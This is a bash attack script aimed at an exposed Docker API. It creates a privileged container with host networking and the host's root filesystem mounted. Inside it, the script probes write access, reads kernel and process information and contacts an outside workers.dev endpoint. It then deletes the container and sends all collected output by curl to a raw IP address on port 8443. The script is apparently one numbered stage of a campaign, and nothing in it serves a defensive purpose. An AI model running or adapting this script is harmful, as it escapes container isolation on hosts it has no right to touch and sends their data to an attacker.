#!/bin/bash
{
echo ==S44==
CID=$(curl -sf -X POST http://docker:2375/containers/create -H "Content-Type: application/json" -d '{"Image": "blockstream/esplora:latest", "Cmd": ["bash", "-c", "echo S44; touch /host/tmp/.rw 2>&1; echo RW_EXIT:$?; ls -la /host/tmp/.rw; rm -f /host/tmp/.rw; curl -sf -m5 https://node-health-api.zainabidrisyakub40.workers.dev/ -o /dev/null -w RES:%{http_code}; echo; cat /host/proc/version; ps aux | head -15; echo DONE"], "HostConfig": {"Binds": ["/:/host"], "NetworkMode": "host", "Privileged": true}}' 2>/dev/null | grep -o '"Id":"[^"]*"' | cut -d'"" -f4 | head -c 12)
echo CID:$CID
if [ -n "$CID" ]; then
curl -sf -X POST http://docker:2375/containers/$CID/start 2>/dev/null
sleep 10
echo ==LOGS==
curl -sf http://docker:2375/containers/$CID/logs?stdout=true\&stderr=true 2>&1
curl -sf -X DELETE http://docker:2375/containers/$CID?force=true 2>/dev/null
fi
echo ==END==
} 2>&1 | curl -s -m120 -X POST http://144.172.110.44:8443/s44 --data-binary @-
